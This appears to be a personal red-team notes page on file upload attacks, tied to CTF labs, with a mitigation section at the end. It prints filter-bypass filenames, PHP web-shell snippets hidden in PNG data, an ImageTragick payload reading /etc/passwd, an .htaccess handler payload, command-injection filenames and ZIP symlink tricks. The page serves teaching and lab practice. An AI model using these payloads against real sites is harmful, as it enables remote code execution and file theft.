# File upload

[![fileuploadattacks](../../../../_badges/htb/fileuploadattacks.svg)](https://academy.hackthebox.com/course/preview/file-upload-attacks)
[![uploadvulns](../../../../_badges/thmp/uploadvulns.svg)](https://tryhackme.com/room/uploadvulns)
[![adventofcyber2](../../../../_badges/thm/adventofcyber2/day1.svg)](https://tryhackme.com/room/adventofcyber2)
[![vulnversity](../../../../_badges/thm-p/vulnversity.svg)](https://tryhackme.com/room/vulnversity)
[![rrootme](../../../../_badges/thm-p/rrootme.svg)](https://tryhackme.com/room/rrootme)
[![startup](../../../../_badges/thm-p/startup.svg)](https://tryhackme.com/room/startup)
[![bypassdisablefunctions](../../../../_badges/thm-p/bypassdisablefunctions.svg)](https://tryhackme.com/r/room/bypassdisablefunctions)
![nibbles](../../../../_badges/htb-p/nibbles.svg)
[![double_extensions](../../../../_badges/rootme/web_server/double_extensions.svg)](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions)
[![mime_type](../../../../_badges/rootme/web_server/mime_type.svg)](https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type)
[![null_byte](../../../../_badges/rootme/web_server/null_byte.svg)](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Null-byte)
[![file_upload_zip](../../../../_badges/rootme/web_server/file_upload_zip.svg)](https://www.root-me.org/en/Challenges/Web-Server/File-upload-ZIP)
[![local_file_inclusion_wrappers](../../../../_badges/rootme/web_server/local_file_inclusion_wrappers.svg)](https://www.root-me.org/fr/Challenges/Web-Serveur/Local-File-Inclusion-Wrappers)
[![file_upload_polyglot](../../../../_badges/rootme/web_server/file_upload_polyglot.svg)](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Polyglot)
[![samcms](../../../../_badges/rootme/realist/samcms.svg)](https://www.root-me.org/en/Challenges/Realist/SamCMS)
[![imagick](../../../../_badges/rootme/realist/imagick.svg)](https://www.root-me.org/en/Challenges/Realist/Imagick)
[![php_apache_configuration](../../../../_badges/rootme/web_server/php_apache_configuration.svg)](https://www.root-me.org/en/Challenges/Web-Server/PHP-Apache-configuration)

<div class="row row-cols-lg-2"><div>

It's common for websites to allow users to upload files such as an avatar. Unfortunately, in some cases, a hacker can upload malicious files such as a script leading to **Remote Code Execution** (RCE).

Usually, most websites have filters, but there are often logic flaws in the filtering, leading to malicious files successfully uploaded.
</div><div>

There may be JavaScript filters, and to be more efficient while making requests, we usually use tools such as:

* [Burp Suite](/cybersecurity/red-team/tools/utilities/proxies/burp/modules/repeater.md) Repeater
* [uffuf](/cybersecurity/red-team/tools/frameworks/onectf/index.md#onectf-uffuf-module)
* [curl](/operating-systems/linux/commands/list.md#command-curl)

```ps
# submit a file with name=file and value=path/to/file
$ curl -X POST -F "submit:value" -F "file:@path/to/file" URL
```

‚û°Ô∏è Refer to [File Upload Wordlists](/cybersecurity/red-team/_knowledge/topics/wordlists.md#file-upload).
</div></div>

<hr class="sep-both">

## Theoretical Process

<div class="row row-cols-md-2 mt-4"><div>

1. ‚úÖ Upload a valid file<br><span>&nbsp;</span>
2. üîç Look for the folder where the file was uploaded.

<br>

* Try to determine the naming scheme <small>(ex: {time}-{filename}.png)</small>. You may have to use [forced browsing tools](/cybersecurity/red-team/s2.discovery/techniques/websites/forced_browsing.md) if indexing was turned off.
* Try to see the behavior if uploading a file with the same name

<br>

3. ‚õî Try to upload a file that may be rejected<br><span>&nbsp;</span>
</div><div>

4. üîì If it was rejected, try a lot of payloads to see what the filter is using to assess whether a file can/can't be accepted. See the filter evasion section below. **Test your valid file with**:

* the extension of the one that was rejected
* the MIME type of the one that was rejected
* the magic number of the one that was rejected
* ...<br><span>&nbsp;</span>

5. üí£ Try testing different file sizes to find the maximum upload size

6. ü¶ò Look if the image was transformed <small>(resized, compressed)</small>
</div></div>

<hr class="sep-both">

## Filter evasion

*PHP functions that may be involved: `pathinfo`...*

<div class="row row-cols-md-2 mt-4"><div>

#### Extension Filter Bypass

[![fileuploadattacks](../../../../_badges/htb/fileuploadattacks.svg)](https://academy.hackthebox.com/course/preview/file-upload-attacks)
[![uploadvulns](../../../../_badges/thmp/uploadvulns.svg)](https://tryhackme.com/room/uploadvulns)
[![adventofcyber2](../../../../_badges/thm/adventofcyber2/day2.svg)](https://tryhackme.com/room/adventofcyber2)
[![adventofcyber2](../../../../_badges/thm/adventofcyber2/day24.svg)](https://tryhackme.com/room/adventofcyber2)

The filter may uses "contains" instead of "ends with", which is often present due to the usage of a regex while missing a `$`.

```text!
malicious.png.php
```

If they use a blacklist/deny list

* Other extensions that may have been enabled: `.php5`, `.phtml`, `.php2`, `.php3`, `.php4`,`.php7`, `.pht`, `.phps`, `.phar`, `.inc`...

* The filter may be case-sensitive: `.pHp`, `.PHP`, `.PHTML`... But these extensions will mostly not be executed on Linux.

<br>

#### Character Filter Bypass

[![fileuploadattacks](../../../../_badges/htb/fileuploadattacks.svg)](https://academy.hackthebox.com/course/preview/file-upload-attacks)
[![uploadvulns](../../../../_badges/thmp/uploadvulns.svg)](https://tryhackme.com/room/uploadvulns)
[![null_byte](../../../../_badges/rootme/web_server/null_byte.svg)](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Null-byte)

For instance, the null byte <small>(PHP < 5.3.4)</small>:

```text!
malicious.php%00.png -> malicious.php
malicious.php\x00.png -> malicious.php
```

Other characters:

* `%20` (space)
* `%0a`/`%0d%0a`/`%0d%0d%0a` (line breaks)
* `/`, `.\`, `.`, `‚Ä¶`, 
* On Windows, `file.php:.jpg` becomes `file.php`

<br>

#### Bypass Using Metadata

We can inject code in an image metadata, such as with:

```ps
$ exiftool -comment="<?php phpinfo(); ?>" file.png
```
</div><div>

#### File Content Filter Bypass

[![uploadvulns](../../../../_badges/thmp/uploadvulns.svg)](https://tryhackme.com/room/uploadvulns)

If there is a filter checking for the `<?php` tag, you can try:

* testing if the filter is case-sensitive: `<?PHP`, `<?pHP`...
* testing  with another variant: `<?="xxx"?>`...

<br>

#### MIME-type Filter Bypass

[![fileuploadattacks](../../../../_badges/htb/fileuploadattacks.svg)](https://academy.hackthebox.com/course/preview/file-upload-attacks)
[![uploadvulns](../../../../_badges/thmp/uploadvulns.svg)](https://tryhackme.com/room/uploadvulns)
[![bypassdisablefunctions](../../../../_badges/thm-p/bypassdisablefunctions.svg)](https://tryhackme.com/r/room/bypassdisablefunctions)

[MIME-type](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types) filters may use the user content-type header send with the request, that we can easily spoof.

```text!
Content-Type: application/php -> image/png
```

If the application checks the MIME-type itself, we can spoof the file magic number. Using a command such as `file xxx`, you can see the current infered MIME-type. This is done by checking the first bytes of the file for a value called [magic numbers](https://en.wikipedia.org/wiki/List_of_file_signatures)/[Apple Reference](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime).

* Fake GIF

```ps
$ echo 'GIF8<php content here>' > script.php
```

* Fake JPG

```ps
$ mv script.php script.jpg
$ file script.jpg # ASCII text
$ cat script.jpg
xxxx[...] # added 4 dummy characters at the start
$ hexeditor script.jpg # FF D8 FF E0 then CTRL+X
$ file script.jpg # JPG
```
</div></div>

<hr class="sep-both">

## Image Transformations

<div class="row row-cols-lg-2"><div>

Images may be processed by the server, such as being resized, compressed, etc. These operations will lead to pixels being deleted and the payload being lost. The [GD library](https://www.php.net/manual/en/book.image.php) is commonly used in PHP.

* [Astrolock](https://github.com/synacktiv/astrolock/) (Vulnerable APP)
* [Overview of the different techniques](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) (2022)
* [French article extending the original article](https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/) (2014)
* [Original Article](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/) (2012)

The original author compiled the sequence `a39f67546f2c24152b116712546f112e29152b2167226b6f5f5310` that corresponds to `<?=$_GET[0]($_POST[1]);?>` after applying the  PNG Filters and a compression algorithm on the image.

‚û°Ô∏è Use [huntergregal IDAT generator](https://github.com/huntergregal/PNG-IDAT-Payload-Generator) <small>(0.2k ‚≠ê)</small> or [pixload](https://github.com/sighook/pixload)<small>(1.2k ‚≠ê)</small> for XSS. Use [Astrolock generators](https://github.com/synacktiv/astrolock/tree/main/payloads/generators) <small>(0.1k ‚≠ê)</small> for PHP code injection in PNGs.

#### ImageMagick File Conversation ‚Äî Imagetragick CVEs

[![imagick](../../../../_badges/rootme/realist/imagick.svg)](https://www.root-me.org/en/Challenges/Realist/Imagick)

Back in 2016, [4 critical CVEs](https://imagetragick.com/) and [one in 2020](https://www.synacktiv.com/en/publications/playing-with-imagetragick-like-its-2016.html) were discovered in ImageMagick allowing file reading/writing, SSRF, and RCE.

```perl
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
fill 'url(https://example.com/image.jpg"; [...]"'
pop graphic-context
```
</div><div>

#### Imagick Image Resizing

Not covered for now.

<br>

#### PLTE Chunk

Not covered for now.

<br>

#### GD Image Resizing ‚Äî PHP

[![samcms](../../../../_badges/rootme/realist/samcms.svg)](https://www.root-me.org/en/Challenges/Realist/SamCMS)

If the uploaded image was resized to a fixed size that is less than 61 pixels, there are reliable ways to inject PHP code that survives resizing. There are multiple PHP scripts for 40x40 and 55x55.

I wrote a Python script that requires the `pillow` library. It supports images up to 61x61 as per the article from 2014.

```ps
$ pip install pillow
$ wget "https://raw.githubusercontent.com/QuentinRa/blog.quentinra.dev/master/cybersecurity/red-team/s3.exploitation/vulns/web/files/gd_hide_php_in_png.py"
$ python3 gd_hide_php_in_png.py --size 55
OK
$ cat in.png  # the image to upload
$ cat out.png # the image after resizing
```
</div></div>

<hr class="sep-both">

## Other techniques

<div class="row row-cols-lg-2"><div>

#### Reverse Double Extension

[![fileuploadattacks](../../../../_badges/htb/fileuploadattacks.svg)](https://academy.hackthebox.com/course/preview/file-upload-attacks)
[![double_extensions](../../../../_badges/rootme/web_server/double_extensions.svg)](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions)

It's possible that the website administrator had misconfigured the web server, allowing files such as `script.php.jpg` to be executed.

As regexes are used to define which files can be executed, if the `$` is missing, then the server is misconfigured.

As this is not common to edit this kind of setting, it's unlikely to occur.

<br>

#### Polyglot File

[![file_upload_polyglot](../../../../_badges/rootme/web_server/file_upload_polyglot.svg)](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Polyglot)

In some scenarios, the only way to bypass mitigations is to hide two files in one, with both of them valid. It's not always possible.

Due to how a [phar](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/payloads.md#phar) works, it's possible to add an image such as JPG, inside the stub, before the php code.

<br>

#### Upload .htaccess Configuration

[![php_apache_configuration](../../../../_badges/rootme/web_server/php_apache_configuration.svg)](https://www.root-me.org/en/Challenges/Web-Server/PHP-Apache-configuration)

If we can upload a `.htaccess` file, we can put inside a payload allowing us to reconfigure the Apache server if we were allowed to.

```apacheconf!
php_flag engine on
SetHandler application/x-httpd-php
# <pre><?php echo "hello world!"; ?></pre>
```

Refer to my [htaccess exploitation cheatsheet](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/payloads.md#htaccess).
</div><div>

#### Side Attacks

[![fileuploadattacks](../../../../_badges/htb/fileuploadattacks.svg)](https://academy.hackthebox.com/course/preview/file-upload-attacks)
[![file_upload_zip](../../../../_badges/rootme/web_server/file_upload_zip.svg)](https://www.root-me.org/en/Challenges/Web-Server/File-upload-ZIP)

Even if the upload is not vulnerable and we can't upload a webshell, we may still be able to perform other attacks:

* Use the filename for injections <small>(command, XML, SQL, etc.)</small>

```shell!
$ file$(whoami).jpg
$ file`whoami`.jpg
$ file.jpg||whoami
```

* Use a overly long filename to see if it raises an error

* If we can upload a SVG, we can try a [XXE](/cybersecurity/red-team/s3.exploitation/vulns/serialization/xxe.md) attack to read the source code <small>(disclose the upload directory, etc.)</small>.

* If the websites display the metadata, we may be able to perform an [XSS](/cybersecurity/red-team/s3.exploitation/vulns/web/xss.md) attack. For instance,

```ps
$ exiftool -Comment='<xss payload here>' file.php
```

* When uploading a ZIP that is decompressed, you may try to see if you can use symlink to read files.

```ps
$ ln -s ../../../index.php index.txt   # read index.php
$ zip --symlinks test.zip index.txt
$ zip -y test.zip index.txt
```
</div></div>

<hr class="sep-both">

## Mitigation üõ°Ô∏è

<div class="row row-cols-lg-2"><div>

* **Extension Validation** üîí: both blacklist and whitelist extensions. Ensure the logic checks the last extension.

* **Filetype Validation** üîë: do not use the client Content-Type/MIME type. Use the magic number to check the file type.

* **Upload Folder Disclosure** üìÅ: hide the upload folder, especially if users are not supposed to access uploaded files. If possible, ensure it is not accessible from the web <small>(see also: web root, .htaccess, etc.)</small>.

* **Server-side Validation** üìö: client-side validations are nice for normal users but not enough as they can be disabled or ignored.
</div><div>

* **Upload File(s) Disclosure** üìÑ: if the folder is accessible, access to uploaded files must be restricted based on whether should be able to access them or not. Randomize the names or avoid using user-input to name the file <small>(ex: append the extension)</small>. Disable indexing.

* Add **Upload Size** üé° restrictions and use a **WAF** üßØ

As always, we can configure the server to block some functions or disable access to folders outside the application directories.

* [PHP Security And Bypasses](/programming-languages/web/php/_general/index.md#php-security-and-bypasses-)
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [Exif Data](https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/)
* [Disable php extension](https://stackoverflow.com/questions/1271899/disable-php-in-directory-including-all-sub-directories-with-htaccess)
* [motasem-notes](https://motasem-notes.net/bypassing-php-disable-functions-and-upload-filters-tryhackme/)
* [File Magic Numbers](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5)
</div><div>

* FTP, if it's linked to the website folder, and we can upload files
* Decompression Bomb, Pixel Flood
* Windows specific attacks with invalid filename `(CON, COM1, LPT1, or NUL)` or reserved characters `(|, <, >, *, or ?)`
</div></div>